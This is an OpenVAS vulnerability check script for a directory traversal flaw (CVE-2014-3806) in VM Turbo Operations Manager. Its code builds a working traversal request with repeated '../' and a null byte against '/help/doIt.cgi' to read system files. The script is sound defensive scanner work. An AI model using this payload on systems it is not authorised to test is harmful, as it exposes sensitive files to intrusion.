###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vmturbo_operations_mngr_dir_trav_vuln.nasl 11888 2018-10-12 15:27:49Z cfischer $
#
# VM Turbo Operations Manager Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804448");
  script_version("$Revision: 11888 $");
  script_cve_id("CVE-2014-3806");
  script_bugtraq_id(67292);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 17:27:49 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-05-09 14:42:04 +0530 (Fri, 09 May 2014)");
  script_name("VM Turbo Operations Manager Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Turbo Operations Manager and is prone to directory
  traversal vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check whether it is able read the system
  files to execute or not.");
  script_tag(name:"insight", value:"Input passed to the 'xml_path' parameter in '/cgi-bin/help/doIt.cgi' is not
  properly sanitised before being used to get the contents of a resource.");
  script_tag(name:"impact", value:"Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.");
  script_tag(name:"affected", value:"VM Turbo Operations Manager 4.5.x and earlier");
  script_tag(name:"solution", value:"Upgrade to VM Turbo Operations Manager 4.6 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/532061");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/vm-turbo-operations-manager-45x-directory-traversal");
  script_xref(name:"URL", value:"https://support.vmturbo.com/hc/en-us/articles/203170127-VMTurbo-Operations-Manager-v4-6-Announcement");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://go.vmturbo.com/cloud-edition-download.html");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

vmtPort = get_http_port(default:80);

foreach dir (make_list_unique("/", "/VMTurbo", "/manager", "/operation-manager", cgi_dirs(port:vmtPort)))
{

  if(dir == "/") dir = "";

  vmtReq = http_get(item:string(dir, "/help/index.html"),  port:vmtPort);
  vmtRes = http_keepalive_send_recv(port:vmtPort, data:vmtReq);

  if(">VMTurbo Operations Manager" >< vmtRes)
  {
    files = traversal_files();

    foreach file (keys(files))
    {
      url = dir + "/help/doIt.cgi?FUNC=load_xml_file&amp;xml_path=" +
            crap(data:"../",length:3*15) + files[file] + "%00";

      if(http_vuln_check(port:vmtPort, url:url, check_header:TRUE, pattern:file))
      {
        security_message(port:vmtPort);
        exit(0);
      }
    }
  }
}

exit(99);
